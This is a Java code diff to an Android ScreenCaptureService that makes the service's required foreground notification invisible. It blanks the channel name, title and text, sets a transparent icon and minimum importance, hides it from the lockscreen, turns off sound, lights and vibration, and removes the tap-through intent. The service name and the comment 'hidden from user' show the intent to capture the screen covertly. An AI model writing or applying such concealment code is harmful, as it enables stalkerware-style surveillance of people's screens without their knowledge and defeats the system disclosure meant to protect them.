@@ -75,14 +75,19 @@ public class ScreenCaptureService extends Service {
         Log.d(TAG, "Screen Capture Service destroyed");
     }
     
-    // Create notification channel for Android O and above
+    // Create invisible notification channel for Android O and above
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Screen Capture Service",
-                    NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Channel for Screen Capture Service");
+                    "",
+                    NotificationManager.IMPORTANCE_MIN);
+            channel.setDescription("");
+            channel.setSound(null, null);
+            channel.enableVibration(false);
+            channel.enableLights(false);
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
             
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -91,20 +96,21 @@ public class ScreenCaptureService extends Service {
         }
     }
     
-    // Create notification for foreground service (hidden from user)
+    // Create invisible notification for foreground service
     private Notification createNotification() {
-        Intent notificationIntent = new Intent(this, SharingActivity.class);
-        PendingIntent pendingIntent = PendingIntent.getActivity(
-                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
-        
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Background Service")
-                .setContentText("App is running in background")
-                .setSmallIcon(R.drawable.ic_launcher_foreground)
-                .setContentIntent(pendingIntent)
+                .setContentTitle("")
+                .setContentText("")
+                .setSmallIcon(android.R.color.transparent)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setOngoing(false)
                 .setAutoCancel(true)
+                .setShowWhen(false)
+                .setSound(null)
+                .setVibrate(null)
+                .setLights(0, 0, 0)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .build();
     }
 }
